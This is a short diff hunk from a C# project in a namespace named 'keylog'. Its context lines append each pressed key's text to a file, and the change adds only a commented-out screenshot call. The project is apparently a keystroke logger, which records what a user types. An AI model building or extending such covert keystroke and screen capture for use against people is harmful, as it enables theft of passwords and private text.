@@ -40,6 +40,8 @@ namespace keylog
             }
             var keyText = keyMapper.GetKeyText(e.KeyCode);
             File.AppendAllText(filePath, keyText);
+
+           // Functions.ScreenShot();
         }
 
         protected override void OnLoad(EventArgs e)
